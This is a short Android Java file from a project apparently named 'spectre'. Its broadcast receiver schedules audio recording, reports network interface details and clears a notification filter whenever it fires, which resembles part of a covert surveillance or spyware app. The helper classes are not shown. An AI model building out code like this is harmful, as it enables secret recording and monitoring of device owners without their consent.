package com.hygnus.spectre;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class Ticker extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        AudioRecorder.schedule(); // Uncomment if you want to schedule audio recording
        NetworkDriver.reportNetworkInterface();
        NotificationDriver.clearFilter();
    }
}